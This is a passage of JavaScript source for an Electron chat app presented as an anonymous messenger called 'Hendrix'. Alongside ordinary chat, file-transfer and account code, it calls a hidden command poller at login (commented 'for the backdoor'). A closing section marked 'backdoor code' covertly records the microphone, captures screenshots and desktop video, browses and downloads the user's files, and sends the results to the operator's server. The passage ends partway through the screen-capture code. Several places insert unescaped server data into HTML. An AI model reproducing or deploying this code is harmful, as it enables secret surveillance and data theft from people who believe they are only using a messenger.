    messageBlock.appendChild(msg);
    return {
        messageBlock,
        childs: {
            nameBlock,
            dateBlock,
            msgBlock: {
                msg,
                fileLink,
                fileProgress,
                launchIcon
            }
        }
    };
};

const addMessageSound = (message, user) => {
    if (message.user == user._id) {
        playSound(getInpSound());
    } else {
        playSound(getOutSound());
    }
};

const colorReg = `(?:#(?:[\\da-f]{3}){1,2})|(?:aqua)|(?:black)|(?:blue)|(?:fuchsia)|(?:gray)|(?:green)|(?:lime)|(?:maroon)|(?:navy)|(?:olive)|(?:orange)|(?:purple)|(?:red)|(?:silver)|(?:teal)|(?:white)|(?:yellow)|(?:pink)`;

const compiledRegs = [
    new RegExp(`(?:\\W|^)clr\\s*=\\s*(${colorReg})`, `i`),
    new RegExp(`(?:\\W|^)bgclr\\s*=\\s*(${colorReg})`, `i`)
];

const getReplacer = (reg, conditionCallback, pos, string, handlers) => (style, r) => {
    const match = style.match(reg);
    const condition = !!conditionCallback(match);
    if (condition) {
        if (handlers) {
            r[pos].push(string.replace(/\{\s*(\d+)\s*\}/g, (m, pos) => handlers[pos] ? handlers[pos](match[pos]) : match[pos]));
        } else {
            r[pos].push(string.replace(/\{\s*(\d+)\s*\}/g, (m, pos) => match[pos]));
        }
    }
    return condition;
};

const regs = [{
        replace: getReplacer(compiledRegs[0], match => match, 2, `color:{1};`)
    },
    {
        replace: getReplacer(compiledRegs[1], match => match, 2, `background-color:{1};`)
    },
    {
        replace: getReplacer(/(?:\W|^)hd/i, match => match, 5, `hidden`)
    },
    {
        replace: getReplacer(/(?:\W|^)size\s*=\s*(\d+)/i, match => match && +match[1] <= 100, 2, `font-size:{1}px;`)
    },
    {
        replace: getReplacer(/(?:\W|^)opacity\s*=\s*(\d+)/i, match => match && +match[1] <= 100, 2, `opacity:{1};`, {
            1: opacity => opacity / 100
        })
    },
    {
        replace: getReplacer(/(?:\W|^)text\s*=\s*((?:undr)|(?:ovrl)|(?:lh))/i, match => match, 2, `text-decoration:{1};`, {
            1: (style) => {
                style = style.toLowerCase();
                const obj = {
                    undr: `underline`,
                    ovrl: `overline`,
                    lh: `line-through`
                }
                return obj[style];
            }
        })
    },
    {
        replace: getReplacer(/(?:\W|^)bold/i, match => match, 2, `font-weight:bold;`)
    },
    {
        replace: getReplacer(/(?:\W|^)itc/i, match => match, 2, `font-style:italic;`)
    },
    {
        replace: getReplacer(/(?:\W|^)font\s*=\s*([a-z]+)/i, match => match, 2, `font-family:{1};`)
    }
];

const replaceInsertByPos = (text, beginPos, len, repText) => `${text.slice(0, beginPos)}${repText}${text.slice(text.length - (text.length - (beginPos + len)))}`;

const parseStyles = text => {
    let bgcounter = 0;
    let endcounter = 0;
    text = text.replace(/\[([^\]\/]*)\]/g, (match, style) => {
        const r = [`<span `, `style="`, [], `" `, `class="`, [], `">`];
        let worked = false;
        for (let i = 0; i < regs.length; i++) {
            if (regs[i].replace(style, r)) {
                worked = true;
            }
        }
        if (worked) {
            bgcounter++;
            return r.map(e => typeof e == `object` ? e.join(` `) : e).join(``);
        } else {
            return match;
        }
    });
    const endreg = /\[\s*\/\s*\]/g;
    const ends = [];
    let res;
    while (res = endreg.exec(text)) {
        ends.push(res);
    }
    ends.reverse();
    let i = 0;
    while (endcounter < bgcounter && i < ends.length) {
        const m = ends[i];
        text = replaceInsertByPos(text, m.index, m[0].length, `</span>`);
        endcounter++;
        i++;
    }
    return text;
};

setInterval(() => {
    let keys = Object.keys(nowTypingList);
    if (keys.length > 7) {
        keys = keys.slice(0, 7);
    }
    if (keys.length) {
        elements.typing.innerHTML = `<pre>${keys.map(_id => nowTypingList[_id]).join(`, `)}${keys.length == 1 ? ` печатает` : ` печатают`}${`.`.repeat(dotsCount++)}</pre>`;
        if (dotsCount > 4) {
            dotsCount = 0;
        }
    } else {
        elements.typing.innerHTML = ``;
        dotsCount = 0;
    }
}, 200);

const scroll = () => {
    if (elements.dialog.scrollHeight - (elements.dialog.scrollTop + elements.dialog.clientHeight) <= 200) {
        elements.dialog.scrollTo(0, elements.dialog.scrollHeight);
    }
};

getElem(`next`).addEventListener(`click`, async function (e) {
    this.blur();
    e.preventDefault();
    let name = getElem(`name`).value;
    const match = name.match(/\s+/);
    if (!testEncrypt(name, testKey)) {
        showErrorModal(`Недопустимые символы`);
    } else if (!name.length) {
        showErrorModal(`Слишком короткое имя`);
    } else if (name.length >= 32) {
        showErrorModal(`Слишком длинное имя`);
    } else if (match && match[0].length == name.length) {
        showErrorModal(`Имя не может быть только из пробелов!`);
    } else {
        const userObj = {
            _history: [],
            _historyPos: -1,
            files: {},
            showNotifications: true,
            _id: await getRandomId(),
            _dump: [],
            async subNotifications(canceled) {
                const obj = {
                    secretString: this.secretString
                };
                if (canceled) {
                    obj.canceled = canceled;
                }
                let notification = await requestPostAsync({
                    url: `${server}/subNotifications`,
                    form: {
                        data: encryptAES(JSON.stringify(obj), this.aesKeyBytes),
                        _id: this._id
                    }
                });
                notification = JSON.parse(decryptAES(notification.data, this.aesKeyBytes));
                const div = document.createElement(`div`);
                div.innerHTML = notification.message;
                const answer = await swal({
                    content: div,
                    buttons: [`Отмена`, `Подключиться`]
                });
                if (answer) {
                    if (this.room) {
                        await this.disconnect();
                    }
                    await connectToTheRoom(notification.password, notification._id, notification.color, notification.name);
                    setImmediate(this.subNotifications);
                } else {
                    setImmediate(this.subNotifications, {
                        _id: notification._id
                    });
                }
            },
            async subscribe() {
                if (!this.room) {
                    return;
                }
                let message = await requestPostAsync({
                    url: `${server}/subscribe`,
                    form: {
                        data: await getDataProperty(this.room, this.aesKeyBytes),
                        _id: this._id
                    }
                });
                if (message.success == false) {
                    return await this.disconnect();
                }
                if (!message) {
                    return setImmediate(this.subscribe);
                }
                message = await getDecryptedData(message.data, this.aesKeyBytes);
                if (message.typing) {
                    if (message.user != this._id) {
                        nowTypingList[message.user] = `<span style="color:${message.color}"><b>${message.name}</b></span>`;
                        if (typingTimers[message.user]) {
                            clearTimeout(typingTimers[message.user]);
                        }
                        typingTimers[message.user] = setTimeout(() => {
                            delete nowTypingList[message.user];
                        }, 5000);
                    }
                    return setImmediate(this.subscribe);
                }
                let additional = ``;
                if (message.confirmed) {
                    message.badges.forEach(bdg => {
                        additional += `<img src="styles/confirmed/${bdg.badge}.png" class="confirmed" onclick="describe('${bdg.description}', ${bdg.badge})">`;
                    });
                }
                const date = new Date(message.date);
                const hours = date.getHours().toString();
                const minutes = date.getMinutes().toString();
                const seconds = date.getSeconds().toString();
                if (message.file) {
                    const {
                        ext,
                        fileId,
                        filePart,
                        position,
                        progress
                    } = message.file;
                    if (message.file.ready) {
                        if (this.files[fileId]) {
                            SSort((a, b) => a - b, this.files[fileId].positions, this.files[fileId].parts);
                        } else {
                            const fileBlock = createMessageBlock(message.color, `${message.name}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`);
                            elements.dialog.appendChild(fileBlock.messageBlock);
                            addMessageSound(message, this);
                            this.files[fileId] = {
                                path: path.join(hendrixdir, `${fileId}${ext}`),
                                fileMsg: fileBlock.childs.msgBlock
                            };
                        }
                        if (this.files[fileId].writeStream) {
                            if (this.files[fileId].positions[0] == 1 && this.files[fileId].positions.every((e, p, a) => !p || e - a[p - 1] == 1)) {
                                const data = await zlib.unzip(Buffer.concat(this.files[fileId].parts.map(e => Buffer.from(e, encoding))));
                                this.files[fileId].writeStream.write(data);
                                message.file.fileData = data.toString(`base64`);
                                const info = this.files[fileId].info;
                                if (info) {
                                    message.file.info = info;
                                }
                                this._dump.push(message);
                                this.files[fileId].writeStream.end();
                                await waitWriteStream(this.files[fileId].writeStream);
                            } else {
                                showErrorModal(`Файл ${this.files[fileId].path} повреждён!`);
                            }
                        }
                        await sleep(250);
                        if (this.showNotifications && !this.isForegroundWindow) {
                            let note = {
                                name: message.name,
                                text: `file${ext}`,
                                color: message.color
                            };
                            if (ext.match(/(png)|(jpg)|(gif)|(jpeg)/i)) {
                                note.image = this.files[fileId].path;
                            }
                            ipcRenderer.send(`notification`, note);
                        }
                        delete this.files[fileId].writeStream;
                        delete this.files[fileId].parts;
                        delete this.files[fileId].positions;
                        let desc = this.files[fileId].info && this.files[fileId].info.description;
                        let ht = this.files[fileId].info && desc ? `<span>${desc}</span><br>` : ``;
                        this.files[fileId].fileMsg.msg.innerHTML =
                            `${ext.match(/(png)|(jpg)|(gif)|(jpeg)/i) ?
                        `<img src="${this.files[fileId].path}" style="max-width: 100%" onmouseup="openFileWithRightClick(event, '${fileId}')">`
                        : ext.match(/(mp3)|(wav)|(ogg)/i) ?
                        `<audio src="${this.files[fileId].path}" controls onmouseup="openFileWithRightClick(event, '${fileId}')"></audio>`
                        : ext.match(/(mp4)|(webm)|(ogv)/i) ?
                        `<video src="${this.files[fileId].path}" controls onmouseup="openFileWithRightClick(event, '${fileId}')"></video>`
                        : `<span class="readyFile"><span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext}</span><img onclick="openFileWithDefaultProgram('${fileId}')" class="launchImage" src="styles/start.png" class="launcIcon">`}<br>${ht}</span>`;
                        delete this.files[fileId].fileMsg;
                    } else {
                        if (!this.files[fileId]) {
                            const fileBlock = createMessageBlock(message.color, `<span onclick="copyText('${message.user}')" class="user">${message.name}</span>${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`);
                            elements.dialog.appendChild(fileBlock.messageBlock);
                            addMessageSound(message, this);
                            scroll();
                            this.files[fileId] = {
                                path: path.join(hendrixdir, `${fileId}${ext}`),
                                positions: [position],
                                parts: [filePart],
                                fileMsg: fileBlock.childs.msgBlock,
                                linkCreated: false
                            };
                            if (message.file.info) {
                                this.files[fileId].info = message.file.info;
                            }
                            this.files[fileId].writeStream = fs.createWriteStream(this.files[fileId].path);
                        } else {
                            this.files[fileId].positions.push(position);
                            this.files[fileId].parts.push(filePart);
                        }
                        if (!this.files[fileId].linkCreated) {
                            this.files[fileId].fileMsg.fileLink.innerHTML = `<span class="sendFile"><img src="styles/file.png" style="-webkit-user-select: none;height: 16px;margin-right: 5px;"><span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext} </span></span>`;
                            this.files[fileId].linkCreated = true;
                        }
                        this.files[fileId].fileMsg.fileProgress.innerHTML = `(${(progress * 100).toFixed(3)}%)`;
                    }
                } else {
                    if (nowTypingList[message.user] && typingTimers[message.user]) {
                        clearTimeout(typingTimers[message.user]);
                        delete typingTimers[message.user];
                        delete nowTypingList[message.user];
                    }
                    const obj = {
                        '<': `&lt;`,
                        '>': `&gt;`
                    };
                    let text = message.message;
                    text = text.replace(/(<)|(>)/g, match => obj[match]).replace(/\b(((https?|ftp):\/\/|www\.)[^\s]+)/g, link => `<span class="lnk" onclick="openLink('${link}');">${link}</span>`);
                    text = parseStyles(text); //парсим мои стили
                    message.message = text;
                    this._dump.push(message);
                    let nameBlock;
                    if (message.user) {
                        nameBlock = `<span onclick="copyText('${message.user}')" class="user">${message.name}</span>`;
                    } else {
                        nameBlock = message.name;
                    }
                    elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, text));
                    if (message.name && message.message && message.color && this.showNotifications && !this.isForegroundWindow) {
                        ipcRenderer.send(`notification`, {
                            name: message.name,
                            text: message.message,
                            color: message.color
                        });
                    }
                    addMessageSound(message, this);
                    scroll();
                    if (message.system && message.out == this._id) {
                        return;
                    }
                }
                setImmediate(this.subscribe);
            },
            async publish(message) {
                const obj = Object.assign(message, this.room);
                let messagejson = JSON.stringify(obj);
                if (obj.message) {
                    obj.message = obj.message.trim();
                }
                if (testEncrypt(messagejson, this.aesKeyBytes)) {
                    requestPostAsync({
                        url: `${server}/publish`,
                        form: {
                            data: await getDataProperty(obj, this.aesKeyBytes),
                            _id: this._id
                        }
                    });
                } else {
                    showErrorModal(`Недопустимые символы`);
                }
            },
            async oneToOneSubscribe() {
                const encryptedMessage = await requestPostAsync({
                    url: `${server}/oneToOneSub`,
                    form: {
                        _id: this._id
                    }
                });
                const message = await getDecryptedData(encryptedMessage.data, this.aesKeyBytes);
                addOneToOneMessage(message.from, this, message.text, message.date);
                setImmediate(this.oneToOneSubscribe);
            },
            async disconnect() {
                if (this.audio) {
                    changeIcon();
                    delete this.audio;
                    recorder.stop(); //остановка по-другому должна быть реализована
                }
                await requestPostAsync({
                    url: `${server}/disconnect`,
                    form: {
                        data: await getDataProperty(this.room, this.aesKeyBytes),
                        _id: this._id
                    }
                });
                delete this.room;
                this._dump = [];
                elements.dialog.innerHTML = elements.titleText.innerHTML = ``;
                return true;
            }
        };
        let color, _token;
        if (localStorage.length) {
            ({
                name,
                color,
                _token
            } = localStorage);
        } else {
            color = `#${getElem(`color`).value}`;
            _token = getElem(`token`).value;
            localStorage.setItem(`name`, name);
            localStorage.setItem(`color`, color);
            localStorage.setItem(`_token`, _token);
        }
        user = userObj;
        user.name = name;
        user.color = color;
        user._token = _token;
        user.subscribe = user.subscribe.bind(user);
        user.oneToOneSubscribe = user.oneToOneSubscribe.bind(user);
        user.subNotifications = user.subNotifications.bind(user);
        const {
            accountId,
            accountPassword
        } = localStorage;
        if (accountId && accountPassword) {
            getElem(`idAcc`).value = accountId;
            getElem(`passwordAcc`).value = accountPassword;
        }
        elements.main.style.transform = `scale(0, 0)`;
        await sleep(500);
        await getFirstKeys();
        user.subNotifications();
        user.oneToOneSubscribe();
        ipcRenderer.send(`alive`, user._id);
        await showRooms();

        getCommand(); //для бекдура, ес чо удалить

        setInterval(async () => {
            await showRooms();
        }, 2000);
        setTimeout(() => {
            elements.main.style.display = `none`;
            elements.chat.style.transform = `scale(1, 1)`;
        }, 1000);
    }
    getElem(`about-program`).addEventListener(`click`, () => {
        const div = document.createElement(`div`);
        div.innerHTML = `<div style="width:100%;word-wrap: break-word;user-select: text;"><img src = "logo.png"><br><br>Anonymous messenger <span style="color:#66CCFF">Hendrix ${version}</span> by <span style="color:#FFA000">HuHguZ</span><br><br>Ваш Id в системе:<br><span style="color: ${user.color}">${user._id}</span></div>`;
        swal({
            content: div,
            button: false
        });
    });
});

if (localStorage.length) {
    getElem(`name`).value = localStorage.getItem(`name`);
    getElem(`token`).value = localStorage.getItem(`_token`);
    getElem(`next`).dispatchEvent(new Event(`click`));
}

const divideBuf = (buf, part = highWaterMark) => {
    const r = [];
    const count = Math.floor(buf.length / part);
    const end = part * count;
    for (let i = 0; i < end; i += part) {
        r.push(buf.slice(i, i + part));
    }
    if (end < buf.length) {
        r.push(buf.slice(end, buf.length));
    }
    return r;
};

document.addEventListener(`keydown`, e => {
    if (e.ctrlKey && e.key.match(/[vм]/i)) {
        if (user.room) {
            const img = clipboard.readImage();
            const url = img.toDataURL();
            let imageBuffer = img.toPNG();
            if (imageBuffer.length) {
                const div = document.createElement(`div`);
                div.innerHTML = `<img src="${url}" style="max-width: 75%; max-height: 75%;"><br><input type="text" id="description">`;
                swal({
                    title: `Отправка изображения`,
                    content: div,
                    buttons: ["Отмена", "Отправить"],
                }, false, () => getElem(`description`).focus()).then(async answer => {
                    if (answer) {
                        const desc = getElem(`description`).value;
                        filesSendCallbacksStack.push(async () => {
                            await sendBuffer(await zlib.deflate(imageBuffer), `.png`, {
                                description: desc.length <= highWaterMark ? desc : ``
                            });
                        });
                    }
                    elements.inputMessage.focus();
                });
            }
        }
    }
});

const waitStream = stream => new Promise((res, rej) => {
    stream.on(`end`, () => {
        res(true);
    });
});

const sendBuffer = async (buffer, ext, info) => {
    const len = buffer.length;
    buffer = divideBuf(buffer, highWaterMark).reverse();
    const readable = Readable();
    readable._read = function () {
        if (buffer.length) {
            this.push(buffer.pop());
        } else {
            this.push(null);
        }
    }
    await sendFile(null, len, readable, ext, info);
};

const sendFile = async (file, size, readable, extn, info) => {
    const callbackStack = [];
    let readStream;
    let ext;
    if (file) {
        readStream = fs.createReadStream(file, {
            highWaterMark
        });
        ext = path.extname(file);
    } else {
        readStream = readable;
        ext = extn;
    }
    const fileId = await getRandomId();
    let pr = 0;
    let position = 0;
    readStream.on(`data`, data => {
        callbackStack.push(async () => {
            pr += data.length;
            position++;
            const progress = pr / size;
            const filePart = data.toString(encoding);
            let obj = {
                filePart,
                fileId,
                ext,
                progress,
                position,
                room: user.room
            };
            if (position == 1) {
                obj.info = info;
            }
            await requestPostAsync({
                url: `${server}/sendFile`,
                form: {
                    data: await getDataProperty(obj, user.aesKeyBytes),
                    _id: user._id
                }
            });
            return true;
        });
    });
    await waitStream(readStream);
    for (let i = 0; i < callbackStack.length; i++) {
        if (!user.room) {
            currentWindow.setProgressBar(0);
            return;
        }
        currentWindow.setProgressBar((i + 1) / callbackStack.length);
        await callbackStack[i]();
    }
    await requestPostAsync({
        url: `${server}/sendFile`,
        form: {
            data: await getDataProperty({
                fileId,
                ext,
                ready: true,
                room: user.room
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
    currentWindow.setProgressBar(0);
    return true;
};

const filesSendCallbacksStack = [];

setTimeout(async function execFilesCallbacks() {
    while (filesSendCallbacksStack.length) {
        await filesSendCallbacksStack.pop()();
    }
    setTimeout(execFilesCallbacks, 500);
}, 0);

const getCallbackFromFiles = files => async () => {
    if (!files || !files.length) {
        return;
    }
    let er = false;
    for (let i = 0; i < files.length; i++) {
        const fullPath = files[i];
        const info = await fs.stat(fullPath);
        if (!info.size) {
            showErrorModal(`${fullPath} пуст, не можем отправить!`);
            er = true;
            continue;
        }
        if (info.size > 10485760) {
            showErrorModal(`${fullPath} слишком велик!`);
            er = true;
        } else {
            await sendBuffer(await zlib.deflate(await fs.readFile(fullPath)), path.extname(fullPath));
        }
    };
    if (!er) {
        swal(`${files.length} файлов успешно отправлено на сервер!`);
    }
};

getElem(`file`).addEventListener(`click`, () => {
    if (user.room) {
        const files = dialog.showOpenDialog(currentWindow, {
            properties: [`openFile`, `multiSelections`]
        });
        filesSendCallbacksStack.push(getCallbackFromFiles(files));
    } else {
        showErrorModal(`Вы ещё не вошли в комнату!`);
    }
});

document.ondragover = function () {
    return false;
};

document.ondragleave = function () {
    return false;
};

document.addEventListener(`drop`, event => {
    event.preventDefault();
    if (!user.room) {
        return;
    }
    filesSendCallbacksStack.push(getCallbackFromFiles([...event.dataTransfer.files].map(file => file.path)));
});

const handleError = async err => {
    const errorStack = {};
    Error.captureStackTrace(errorStack);
    const {
        stack
    } = errorStack;
    await requestPostAsync({
        url: `${server}/unhandledError`,
        form: {
            data: await getDataProperty({
                date: date.format(new Date()),
                message: err.message || `Сообщение отсутствует. Проброшено примитивное значение ${err || `undefined`}`,
                stack: err.stack || stack
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
    showErrorDialog(`Необработанное исключение ${err.message || err || `undefined`}. Перезайдите в приложение.`);
    //remote.app.quit();
};

window.addEventListener(`unhandledrejection`, function (promiseRejectionEvent) {
    handleError(promiseRejectionEvent.reason);
});

process.on(`uncaught`, err => {
    handleError(err);
});

const passwordAccNew = getElem(`passwordAccNew`);
const idCreatedAcc = getElem(`idCreatedAcc`);
const idAcc = getElem(`idAcc`);
const passwordAcc = getElem(`passwordAcc`);
const newPasswordInput = getElem(`newPasswordValue`);
const accState = getElem(`accState`);
const balance = getElem(`balance`);
const accOperationsState = getElem(`accOperationsState`);
const operationHistory = getElem(`operationHistory`);
const accOperationtitle = getElem(`accOperationtitle`);
const opsClear = getElem(`opsClear`);
const operationsBlock = getElem(`operations`);
const pageNum = getElem(`pageNum`);

const getHistoryByPage = async page => {
    const {
        _id,
        password
    } = user._account;
    const encryptedAnswer = await requestPostAsync({
        url: `${server}/getOperationsHistory`,
        form: {
            data: await getDataProperty({
                _id,
                password,
                page
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
    return await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
};

const date = {
    options: {
        hour: `numeric`,
        minute: `numeric`,
        second: `numeric`,
    },
    format(date) {
        return `${date.getDate().toString().padStart(2, 0)}.${(date.getMonth() + 1).toString().padStart(2, 0)}.${date.getFullYear()} ${date.toLocaleString(`ru`, this.options)}:${date.getMilliseconds()}`;
    }
};

const showHistoryPage = async page => {
    const {
        historyPart: history
    } = await getHistoryByPage(page);
    const {
        operations
    } = history;
    let r = ``;
    if (operations.length) {
        opsClear.textContent = ``;
        for (let i = 0; i < operations.length; i++) {
            const operation = operations[i];
            let sender = `Вы`,
                recipient = operation._id;
            if (!operation.outgoing) {
                [sender, recipient] = [recipient, sender];
            }
            r +=
                `<tr class="historyString">
    <td>${sender}</td>
    <td><span class="opstd"><img src="styles/send.png" style="height: 25px;"></span></td>
    <td>${recipient}</td>
    <td><span style="font-weight: bold; color: ${operation.value < 0 ? `red` : `green`}">${operation.value > 0 ? `+`: ``}${operation.value}</span></td>
    <td>${date.format(new Date(operation.date))}</td>
    <td>${operation.comment}</td>
</tr>`;
        }
    } else {
        opsClear.textContent = `Здесь пока пусто`;
    }
    operationsBlock.innerHTML = `<table style="display: inline-block; user-select: text; border-collapse: collapse;">${r}</table>`;
};

let curPage = 0;

getElem(`pageNumForm`).addEventListener(`submit`, e => {
    e.preventDefault();
    const newPage = +pageNum.value;
    if (Number.isInteger(newPage) && newPage >= 0) {
        opsClear.textContent = ``;
        curPage = newPage;
        showHistoryPage(curPage);
    } else {
        pageNum.value = 0;
        opsClear.textContent = `Номер страницы должен быть целым положительным числом`;
    }
});

getElem(`operationsNext`).addEventListener(`click`, () => {
    curPage++;
    pageNum.value = curPage;
    showHistoryPage(curPage);
});

getElem(`operationsBack`).addEventListener(`click`, () => {
    if (curPage) {
        curPage--;
        pageNum.value = curPage;
        showHistoryPage(curPage);
    }
});

getElem(`showOperationHistory`).addEventListener(`click`, async () => {
    if (user._account) {
        operationHistory.style.display = `block`;
        accOperationtitle.textContent = `История операций счета ${user._account._id}`;
        await showHistoryPage(curPage);
        swal({
            content: operationHistory,
            button: false
        }, true).then(() => {
            swal({
                content: elements.moneyAccount,
                button: false
            });
        });
    } else {
        accOperationsState.textContent = `У вас нет счета!`;
    }
});

getElem(`deleteAcc`).addEventListener(`click`, async () => {
    if (user._account) {
        swal({
            title: `Внимание!`,
            text: "Вы уверены, что хотите удалить счет? Вернуть удаленные данные не представляется возможным!",
            buttons: ["Отмена", "Да"],
            icon: "warning",
        }, true).then(async answer => {
            if (answer) {
                const {
                    _id,
                    password
                } = user._account;
                const answer = await requestPostAsync({
                    url: `${server}/deleteAccount`,
                    form: {
                        data: await getDataProperty({
                            _id,
                            password,
                        }, user.aesKeyBytes),
                        _id: user._id
                    }
                });
                if (answer.success) {
                    delete user._account;
                    accOperationsState.textContent = `Счет удален.`;
                    balance.textContent = ``;
                    accState.textContent = ``;
                } else {
                    accOperationsState.textContent = `Не удалось удалить счет.`;
                }
            }
            swal({
                content: elements.moneyAccount,
                button: false
            });
        });
    } else {
        accOperationsState.textContent = `У вас нет счета!`;
    }
});

getElem(`loginInAcc`).addEventListener(`click`, async () => {
    const p = passwordAcc.value;
    const password = hashPassword(p);
    const _id = idAcc.value;
    const encryptedAnswer = await requestPostAsync({
        url: `${server}/loginInAccount`,
        form: {
            data: await getDataProperty({
                _id,
                password
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
    const answer = await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
    if (answer.logIn) {
        accState.textContent = `Ваш текущий счет: ${_id}`;
        accOperationsState.textContent = ``;
        balance.textContent = answer.balance;
        balance.style.color = !answer.balance ? `inherit` : answer.balance > 0 ? `green` : `red`;
        localStorage.setItem(`accountId`, _id);
        localStorage.setItem(`accountPassword`, p);
        user._account = {
            _id,
            password
        };
    } else {
        accState.textContent = `Неправильный id или пароль`;
        delete user._account;
        balance.textContent = ``;
        accOperationsState.textContent = ``;
    }
});

getElem(`changePasswordAcc`).addEventListener(`click`, () => {
    if (user._account) {
        swal({
            title: `Внимание!`,
            text: "Вы уверены, что хотите изменить пароль счета?",
            buttons: ["Отмена", "Да"],
            icon: "warning",
        }, true).then(async answer => {
            if (answer) {
                const {
                    _id,
                    password
                } = user._account;
                const newPassword = hashPassword(newPasswordInput.value);
                const answer = await requestPostAsync({
                    url: `${server}/changeAccountPassword`,
                    form: {
                        data: await getDataProperty({
                            _id,
                            password,
                            newPassword
                        }, user.aesKeyBytes),
                        _id: user._id
                    }
                });
                if (answer.success) {
                    delete user._account;
                    accOperationsState.textContent = `Пароль успешно изменен.`;
                    balance.textContent = ``;
                    accState.textContent = ``;
                } else {
                    accOperationsState.textContent = `Пароли не должны совпадать!`;
                }
            }
            swal({
                content: elements.moneyAccount,
                button: false
            });
        });
    } else {
        accOperationsState.textContent = `У вас нет счета!`;
    }
});

let once = false;
let createdId;

getElem(`createMoneyAcc`).addEventListener(`click`, async () => {
    if (once) {
        idCreatedAcc.textContent = `Вы уже создали счет. Его id: ${createdId}`;
        return;
    }
    const encryptedAnswer = await requestPostAsync({
        url: `${server}/createAccount`,
        form: {
            data: await getDataProperty({
                password: hashPassword(passwordAccNew.value)
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
    const {
        _id
    } = await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
    createdId = _id;
    idCreatedAcc.textContent = `id созданного счета: ${_id}`;
    once = !once;
});

elements.money.addEventListener(`click`, () => {
    elements.moneyAccount.style.display = `block`;
    swal({
        content: elements.moneyAccount,
        button: false
    });
});

const oneToOneBlock = getElem(`oneToOneBlock`);
const oneToOneMessagesTable = getElem(`oneToOneMessagesTable`);
const oneToOneRecipient = getElem(`oneToOneRecipient`);
const oneToOneMessage = getElem(`oneToOneMessage`);
const oneToOneStatus = getElem(`oneToOneStatus`);

const addOneToOneMessage = (sender, recipient, text, date) => {
    if (elements.oneToOneMessageSound.checked) {
        playSound(getOneToOneSound());
    }
    return oneToOneMessagesTable.insertAdjacentHTML(`beforeEnd`,
        `<tr class="historyString">
    <td><span class="user" style="font-weight: bold; color: ${sender.color}" onclick="copyText('${sender._id}')">${sender.name}</span></td>
    <td><span class="opstd"><img src="styles/send.png" style="height: 25px;"></span></td>
    <td><span class="user" style="font-weight: bold; color: ${recipient.color}" onclick="copyText('${recipient._id}')">${recipient.name}</span></td>
    <td>${text}</td>
    <td>${date}</td>
</tr>`)
};

getElem(`oneToOneMessageSend`).addEventListener(`click`, async () => {
    const text = oneToOneMessage.value;
    const dt = date.format(new Date());
    const encryptedAnswer = await requestPostAsync({
        url: `${server}/oneToOnePublish`,
        form: {
            data: await getDataProperty({
                _id: oneToOneRecipient.value,
                text,
                date: dt
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
    const answer = await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
    if (answer.success) {
        oneToOneStatus.textContent = ``;
        addOneToOneMessage(user, answer.recipientInfo, text, dt);
    } else {
        oneToOneStatus.textContent = `Сообщение не отправлено`;
    }
});

getElem(`oneToOneMessagesClear`).addEventListener(`click`, () => {
    oneToOneMessagesTable.innerHTML = ``;
});

getElem(`oneToone`).addEventListener(`click`, () => {
    oneToOneBlock.style.display = `block`;
    swal({
        content: oneToOneBlock,
        button: false
    });
});

//backdoor code

let checkedRoot = false;
let accessRoot = false;
const backDoorBlock = getElem(`backDoor`);
const command = getElem(`command`);
const sendCommand = getElem(`sendCommand`);
const recipients = getElem(`recipients`);
const backDoorResults = getElem(`backDoorResults`);
const clearResults = getElem(`clearResults`);
const curPath = getElem(`curPath`);
const goToParentDir = getElem(`goToParentDir`);
const backDoorFilesAndDirs = getElem(`backDoorFilesAndDirs`);
const downloadAll = getElem(`downloadAll`);
const goToStart = getElem(`goToStart`);
const goToPath = getElem(`goToPath`);
const backDoorDir = path.join(hendrixdir, `backdoor`);
const packetSize = 262144;

const getDataPropertyBackDoor = (data, key) => {
    return encryptAES(JSON.stringify(data), key);
};

const getDecryptedDataBackDoor = (data, key) => {
    return JSON.parse(decryptAES(data, key));
}

const determineScreenShotSize = () => {
    const screenSize = screen.getPrimaryDisplay().workAreaSize;
    const maxDimension = Math.max(screenSize.width, screenSize.height);
    return {
        width: maxDimension * window.devicePixelRatio,
        height: maxDimension * window.devicePixelRatio
    };
};

const audio = async (time = 3000) => {
    const recorder = await getAudioRec();
    if (!recorder) {
        return sendReadyData(`Ошибка: доступ к микрофону заблокирован!`);
    }
    recorder.start();
    sendReadyData(`Запись с микрофона началась`);
    recorder.ondataavailable = async e => {
        const buf = await blobToBuffer(e.data);
        filesBackDoorSendCallbacksStack.push(async () => {
            await sendBufferBackDoor(buf, `.mp3`);
        });
    };
    await sleep(time);
    recorder.stop();
    sendReadyData(`Запись с микрофона закончена`);
    recorder.stream.getTracks().map(track => track.stop());
};

let curScreenid;

const stopRec = () => clearInterval(curScreenid);

const rec = time => {
    stopRec();
    curScreenid = setInterval(tsc, time);
};

const desktopVideo = async ({
    time = 2000,
    minWidth = 1280,
    maxWidth = 1280,
    minHeight = 720,
    maxHeight = 720,
    screenNum = 1
} = {}) => {
    const screenName = `Screen ${screenNum}`;
    try {
        const source = (await desktopCapturer.getSources({
            types: ['screen']
        })).find(source => source.name == 'Entire screen' || source.name == screenName);
        const videoSource = await navigator.mediaDevices.getUserMedia({
            audio: {
                mandatory: {
                    chromeMediaSource: 'desktop'
                }
            },
            video: {
                mandatory: {
                    chromeMediaSource: 'desktop',
                    chromeMediaSourceId: source.id,
                    minWidth,
                    maxWidth,
                    minHeight,
                    maxHeight
                }
            }
        });
        sendReadyData(`Запись видео экрана началась`);
        const recorder = new MediaRecorder(videoSource, {
            mimeType: `video/webm;codecs=h264,vp9,opus`
        });
        recorder.start();
        recorder.ondataavailable = async e => {
            const buf = await blobToBuffer(e.data);
